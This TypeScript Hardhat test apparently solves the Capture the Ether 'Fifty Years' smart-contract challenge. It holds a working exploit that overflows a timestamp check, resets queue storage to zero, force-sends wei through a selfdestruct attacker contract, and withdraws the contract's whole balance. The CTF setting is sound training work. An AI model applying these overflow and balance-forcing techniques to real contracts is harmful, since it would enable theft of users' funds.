import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let contract: Contract; // challenge contract
let tx: any;
let printCounter = 0;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(
    "FiftyYearsChallenge"
  );
  contract = challengeFactory.attach(
    `0x89dc1782C7BE0C91d28FE8Dc33a06e79a43BA2E7`
  );
});

it("solves the challenge", async function () {
  // slot 0: queue.length
  // slot 1: head
  // slot sha256(0): queue[0]
  const printStorage = async () => {
    const queueLength = BigNumber.from(
      await contract.provider.getStorageAt(contract.address, 0)
    );
    const head = BigNumber.from(
      await contract.provider.getStorageAt(contract.address, 1)
    );

    const queueData0 = BigNumber.from(
      ethers.utils.keccak256(
        `0x0000000000000000000000000000000000000000000000000000000000000000`
      )
    );

    const entry = BigNumber.from(
      await contract.provider.getStorageAt(contract.address, queueData0)
    );

    console.log(
      printCounter++,
      JSON.stringify(
        {
          queueLength: queueLength.toString(),
          head: head.toString(),
          // entry,
          balance: (await contract.provider.getBalance(contract.address)).toString(),
        },
        null,
        2
      )
    );
  };

  await printStorage();

  // first need valid date to bypass timestamp check
  // such that we can overflow the timestamp check next time
  // and use a 0 timestamp = write 0 to head again
  const ONE_DAYS_IN_SECONDS = 24 * 60 * 60;
  const DATE_OVERFLOW = BigNumber.from(`2`)
    .pow(`256`)
    .sub(ONE_DAYS_IN_SECONDS);
  tx = await contract.upsert(`1`, DATE_OVERFLOW.toString(), {
    value: `1`,
  });
  await tx.wait();
  await printStorage();

  const ZERO = `0`; // will be head value
  tx = await contract.upsert(`2`, ZERO, {
    value: `2`,
  });
  await tx.wait();
  await printStorage();

  // we cannot withdraw all of it now because the contract only contains 1 + 2 = 3 wei
  // but new queue items' .amount sums up to 2 + 3 = 5 wei
  // so need to add at least 2 more wei
  // use a selfdestruct wei transfer bypass first to get to the correct balance
  const attackerFactory = await ethers.getContractFactory("RetirementFundAttacker");
  attacker = await attackerFactory.deploy(contract.address, {
    value: ethers.utils.parseUnits(`2`, `wei`)
  });
  await eoa.provider!.waitForTransaction(attacker.deployTransaction.hash)

  // trigger head overflow, use just inserted contribution (index 2) to bypass
  // timestamp check and withdraw from head=0..2=index
  console.log(`withdrawing all of it`);
  tx = await contract.withdraw(`2`);
  await tx.wait();
  await printStorage();

  const isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
